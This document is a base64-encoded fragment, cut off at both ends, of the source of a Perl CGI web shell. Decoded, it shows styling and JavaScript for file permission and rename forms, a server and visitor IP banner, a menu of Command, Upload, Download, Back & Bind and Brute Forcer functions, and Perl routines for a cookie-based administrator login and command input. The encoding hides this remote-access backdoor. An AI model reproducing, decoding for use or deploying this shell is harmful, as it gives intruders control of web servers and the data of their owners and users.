QpBOnZpc2l0ZWQgewoJQ09MT1I6ICNmZmZmZmY7IFRFWFQtREVDT1JBVElPTjogbm9uZQp9CkE6aG92ZXIgewoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOwoJY29sb3I6ICNGRkZGRkY7IFRFWFQtREVDT1JBVElPTjogbm9uZQp9CkE6YWN0aXZlIHsKCWNvbG9yOiBSZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZQp9Ci5saXN0ZGlyIHRyOmhvdmVyewoJYmFja2dyb3VuZDogIzQ0NDsKfQoubGlzdGRpciB0cjpob3ZlciB0ZHsKCWJhY2tncm91bmQ6ICM0NDQ7Cgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47Cgljb2xvcjogI0ZGRkZGRjsgVEVYVC1ERUNPUkFUSU9OOiBub25lOwp9Ci5ub3RsaW5lewoJYmFja2dyb3VuZDogIzExMTsKfQoubGluZXsKCWJhY2tncm91bmQ6ICMyMjI7Cn0KPC9zdHlsZT4KPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+CmZ1bmN0aW9uIEVuY29kZXIobmFtZSkKewoJdmFyIGUgPSAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQobmFtZSk7CgllLnZhbHVlID0gYnRvYShlLnZhbHVlKTsKCXJldHVybiB0cnVlOwp9CmZ1bmN0aW9uIGNobW9kX2Zvcm0oaSxmaWxlKQp7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZVBlcm1zXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JycgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRFbmNvZGVDdXJyZW50RGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsKfQpmdW5jdGlvbiBybV9jaG1vZF9mb3JtKHJlc3BvbnNlLGkscGVybXMsZmlsZSkKewoJcmVzcG9uc2UuaW5uZXJIVE1MID0gIjxzcGFuIG9uY2xpY2s9XFxcImNobW9kX2Zvcm0oIiArIGkgKyAiLCciKyBmaWxlKyAiJylcXFwiID4iKyBwZXJtcyArIjwvc3Bhbj48L3RkPiI7Cn0KZnVuY3Rpb24gcmVuYW1lX2Zvcm0oaSxmaWxlLGYpCnsKCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOwoJdmFyIGJhY2s9InJtX3JlbmFtZV9mb3JtKCIraSsiLFxcXCIiK2ZpbGUrIlxcXCIsXFxcIiIrZisiXFxcIik7IHJldHVybiBmYWxzZTsiOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nJyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1yZW5hbWUgdHlwZT10ZXh0IHZhbHVlPSAnIitmaWxlKyInIC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIHZhbHVlPU9LPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYmFjayArICInIHZhbHVlPUNhbmNlbD48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRFbmNvZGVDdXJyZW50RGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsKfQpmdW5jdGlvbiBybV9yZW5hbWVfZm9ybShpLGZpbGUsZikKewoJaWYoZj09J2YnKQoJewoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8YSBocmVmPSc/YT1jb21tYW5kJmQ9JEVuY29kZUN1cnJlbnREaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsKCX1lbHNlCgl7CgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOwoJfQp9Cjwvc2NyaXB0Pgo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzBjMGMwYyIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4KPGNlbnRlcj48Y29kZT4KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+Cjx0cj4KCTx0ZCBhbGlnbj0iY2VudGVyIiByb3dzcGFuPTM+CgkJPGI+PGZvbnQgc2l6ZT0iMyI+JEVkaXRQZXJzaW9uPC9mb250PjwvYj4KCTwvdGQ+Cgk8dGQ+CgkJJGluZm8KCTwvdGQ+Cgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSJyZWQiPiAkRU5WeydTRVJWRVJfQUREUid9PC9mb250PiB8IFlvdXIgSVA6IDxmb250IGNvbG9yPSJyZWQiPiRFTlZ7J1JFTU9URV9BRERSJ308L2ZvbnQ+Cgk8L3RkPgo8L3RyPgo8dHI+Cjx0ZCBjb2xzcGFuPSIyIj4KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uIj5Ib21lPC9hPiB8IAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jb21tYW5kJmQ9JEVuY29kZUN1cnJlbnREaXIiPkNvbW1hbmQ8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Z3VpJmQ9JEVuY29kZUN1cnJlbnREaXIiPkdVSTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZUN1cnJlbnREaXIiPlVwbG9hZCBGaWxlPC9hPiB8IAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZkPSRFbmNvZGVDdXJyZW50RGlyIj5Eb3dubG9hZCBGaWxlPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1icnV0ZWZvcmNlciI+QnJ1dGUgRm9yY2VyPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNoZWNrbG9nIj5DaGVjayBMb2c8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG9tYWluc3VzZXIiPkRvbWFpbnMvVXNlcnM8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5Mb2dvdXQ8L2E+IHwKPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9Ii4uL2Vycm9yX2xvZy5waHAiPkhlbHA8L2E+CjwvdGQ+CjwvdHI+Cjx0cj4KPHRkIGNvbHNwYW49IjIiPgokaWQKPC90ZD4KPC90cj4KPC90YWJsZT4KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNGRkZGRkYiID4KRU5ECn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9naW5TY3JlZW4KewoJcHJpbnQgPDxFTkQ7CjxwcmU+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpUeXBpbmdUZXh0ID0gZnVuY3Rpb24oZWxlbWVudCwgaW50ZXJ2YWwsIGN1cnNvciwgZmluaXNoZWRDYWxsYmFjaykgewogIGlmKCh0eXBlb2YgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQgPT0gInVuZGVmaW5lZCIpIHx8ICh0eXBlb2YgZWxlbWVudC5pbm5lckhUTUwgPT0gInVuZGVmaW5lZCIpKSB7CiAgICB0aGlzLnJ1bm5pbmcgPSB0cnVlOwkvLyBOZXZlciBydW4uCiAgICByZXR1cm47CiAgfQogIHRoaXMuZWxlbWVudCA9IGVsZW1lbnQ7CiAgdGhpcy5maW5pc2hlZENhbGxiYWNrID0gKGZpbmlzaGVkQ2FsbGJhY2sgPyBmaW5pc2hlZENhbGxiYWNrIDogZnVuY3Rpb24oKSB7IHJldHVybjsgfSk7CiAgdGhpcy5pbnRlcnZhbCA9ICh0eXBlb2YgaW50ZXJ2YWwgPT0gInVuZGVmaW5lZCIgPyAxMDAgOiBpbnRlcnZhbCk7CiAgdGhpcy5vcmlnVGV4dCA9IHRoaXMuZWxlbWVudC5pbm5lckhUTUw7CiAgdGhpcy51bnBhcnNlZE9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dDsKICB0aGlzLmN1cnNvciA9IChjdXJzb3IgPyBjdXJzb3IgOiAiIik7CiAgdGhpcy5jdXJyZW50VGV4dCA9ICIiOwogIHRoaXMuY3VycmVudENoYXIgPSAwOwogIHRoaXMuZWxlbWVudC50eXBpbmdUZXh0ID0gdGhpczsKICBpZih0aGlzLmVsZW1lbnQuaWQgPT0gIiIpIHRoaXMuZWxlbWVudC5pZCA9ICJ0eXBpbmd0ZXh0IiArIFR5cGluZ1RleHQuY3VycmVudEluZGV4Kys7CiAgVHlwaW5nVGV4dC5hbGwucHVzaCh0aGlzKTsKICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsKICB0aGlzLmluVGFnID0gZmFsc2U7CiAgdGhpcy50YWdCdWZmZXIgPSAiIjsKICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOwogIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICIiOwp9ClR5cGluZ1RleHQuYWxsID0gbmV3IEFycmF5KCk7ClR5cGluZ1RleHQuY3VycmVudEluZGV4ID0gMDsKVHlwaW5nVGV4dC5ydW5BbGwgPSBmdW5jdGlvbigpIHsKICBmb3IodmFyIGkgPSAwOyBpIDwgVHlwaW5nVGV4dC5hbGwubGVuZ3RoOyBpKyspIFR5cGluZ1RleHQuYWxsW2ldLnJ1bigpOwp9ClR5cGluZ1RleHQucHJvdG90eXBlLnJ1biA9IGZ1bmN0aW9uKCkgewogIGlmKHRoaXMucnVubmluZykgcmV0dXJuOwogIGlmKHR5cGVvZiB0aGlzLm9yaWdUZXh0ID09ICJ1bmRlZmluZWQiKSB7CiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7CS8vIFdlIGhhdmVuJ3QgZmluaXNoZWQgbG9hZGluZyB5ZXQuICBIYXZlIHBhdGllbmNlLgogICAgcmV0dXJuOwogIH0KICBpZih0aGlzLmN1cnJlbnRUZXh0ID09ICIiKSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gIiI7Ci8vICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dC5yZXBsYWNlKC88KFtePF0pKj4vLCAiIik7ICAgICAvLyBTdHJpcCBIVE1MIGZyb20gdGV4dC4KICBpZih0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGgpIHsKICAgIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI8IiAmJiAhdGhpcy5pblRhZykgewogICAgICB0aGlzLnRhZ0J1ZmZlciA9ICI8IjsKICAgICAgdGhpcy5pblRhZyA9IHRydWU7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI+IiAmJiB0aGlzLmluVGFnKSB7CiAgICAgIHRoaXMudGFnQnVmZmVyICs9ICI+IjsKICAgICAgdGhpcy5pblRhZyA9IGZhbHNlOwogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMudGFnQnVmZmVyOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSBpZih0aGlzLmluVGFnKSB7CiAgICAgIHRoaXMudGFnQnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiJiIgJiYgIXRoaXMuaW5IVE1MRW50aXR5KSB7CiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICImIjsKICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSB0cnVlOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiOyIgJiYgdGhpcy5pbkhUTUxFbnRpdHkpIHsKICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9ICI7IjsKICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsKICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLkhUTUxFbnRpdHlCdWZmZXI7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMuaW5IVE1MRW50aXR5KSB7CiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgewogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOwogICAgfQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9IHRoaXMuY3VycmVudFRleHQ7CiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MICs9ICh0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGggLSAxID8gKHR5cGVvZiB0aGlzLmN1cnNvciA9PSAiZnVuY3Rpb24iID8gdGhpcy5jdXJzb3IodGhpcy5jdXJyZW50VGV4dCkgOiB0aGlzLmN1cnNvcikgOiAiIik7CiAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7CiAgfSBlbHNlIHsKCXRoaXMuY3VycmVudFRleHQgPSAiIjsKCXRoaXMuY3VycmVudENoYXIgPSAwOwogICAgICAgIHRoaXMucnVubmluZyA9IGZhbHNlOwogICAgICAgIHRoaXMuZmluaXNoZWRDYWxsYmFjaygpOwogIH0KfQo8L3NjcmlwdD4KPC9wcmU+Cgo8YnI+Cgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+Cm5ldyBUeXBpbmdUZXh0KGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJoYWNrIiksIDMwLCBmdW5jdGlvbihpKXsgdmFyIGFyID0gbmV3IEFycmF5KCJfIiwiIik7IHJldHVybiAiICIgKyBhcltpLmxlbmd0aCAlIGFyLmxlbmd0aF07IH0pOwpUeXBpbmdUZXh0LnJ1bkFsbCgpOwoKPC9zY3JpcHQ+CkVORAp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBlbmNvZGUgaHRtbCBzcGVjaWFsIGNoYXJzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFVybEVuY29kZSgkKXsKCW15ICRzdHIgPSBzaGlmdDsKCSRzdHIgPX4gcy8oW15BLVphLXowLTldKS9zcHJpbnRmKCIlJSUwMlgiLCBvcmQoJDEpKS9zZWc7CglyZXR1cm4gJHN0cjsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQWRkIGh0bWwgc3BlY2lhbCBjaGFycwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBIdG1sU3BlY2lhbENoYXJzKCQpewoJbXkgJHRleHQgPSBzaGlmdDsKCSR0ZXh0ID1+IHMvJi8mYW1wOy9nOwoJJHRleHQgPX4gcy8iLyZxdW90Oy9nOwoJJHRleHQgPX4gcy8nLyYjMDM5Oy9nOwoJJHRleHQgPX4gcy88LyZsdDsvZzsKCSR0ZXh0ID1+IHMvPi8mZ3Q7L2c7CglyZXR1cm4gJHRleHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEFkZCBsaW5rIGZvciBkaXJlY3RvcnkKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQWRkTGlua0RpcigkKQp7CglteSAkYWM9c2hpZnQ7CglteSBAZGlyPSgpOwoJaWYoJFdpbk5UKQoJewoJCUBkaXI9c3BsaXQoL1xcLywkQ3VycmVudERpcik7Cgl9ZWxzZQoJewoJCUBkaXI9c3BsaXQoIi8iLCZ0cmltKCRDdXJyZW50RGlyKSk7Cgl9CglteSAkcGF0aD0iIjsKCW15ICRyZXN1bHQ9IiI7Cglmb3JlYWNoIChAZGlyKQoJewoJCSRwYXRoIC49ICRfLiRQYXRoU2VwOwoJCSRyZXN1bHQuPSI8YSBocmVmPSc/YT0iLiRhYy4iJmQ9Ii5lbmNvZGVfYmFzZTY0KCRwYXRoKS4iJz4iLiRfLiRQYXRoU2VwLiI8L2E+IjsKCX0KCXJldHVybiAkcmVzdWx0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIG1lc3NhZ2UgdGhhdCBpbmZvcm1zIHRoZSB1c2VyIG9mIGEgZmFpbGVkIGxvZ2luCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9naW5GYWlsZWRNZXNzYWdlCnsKCXByaW50IDw8RU5EOwoKClBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRm9ybQp7CglwcmludCA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlRm9vdGVyCnsKCXByaW50ICI8YnI+Cgk8Zm9udCBjb2xvcj1yZWQ+PTwvZm9udD48Zm9udCBjb2xvcj1yZWQ+LS0tJmd0OyogIDxmb250IGNvbG9yPSNmZjk5MDA+UGFzcyA9IHh4eCA8L2ZvbnQ+ICAqJmx0Oy0tLT08L2ZvbnQ+PC9jb2RlPgo8L2NlbnRlcj48L2JvZHk+PC9odG1sPiI7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlCiMgdmFyaWFibGUgJENvb2tpZXN7Jyd9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEdldENvb2tpZXMKewoJQGh0dHBjb29raWVzID0gc3BsaXQoLzsgLywkRU5WeydIVFRQX0NPT0tJRSd9KTsKCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpCgl7CgkJKCRpZCwgJHZhbCkgPSBzcGxpdCgvPS8sICRjb29raWUpOwoJCSRDb29raWVzeyRpZH0gPSAkdmFsOwoJfQp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2FpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9nb3V0CnsKCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUKCSZQcmludFBhZ2VIZWFkZXIoInAiKTsKCSZQcmludExvZ291dFNjcmVlbjsKCgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7CglleGl0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdAojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0CiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyCiMgdG8gbG9naW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ2luIAp7CglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZAoJewoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7CgkJJlByaW50UGFnZUhlYWRlcjsKCQlwcmludCAmTGlzdERpcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoKCQl9CgkJJlByaW50TG9naW5Gb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJZXhpdDsKCX0KfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgY29tbWFuZHMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQp7CgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7CglteSAkZGlyPSAiPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJjb21tYW5kIikuIjwvc3Bhbj4iOwoJJFByb21wdC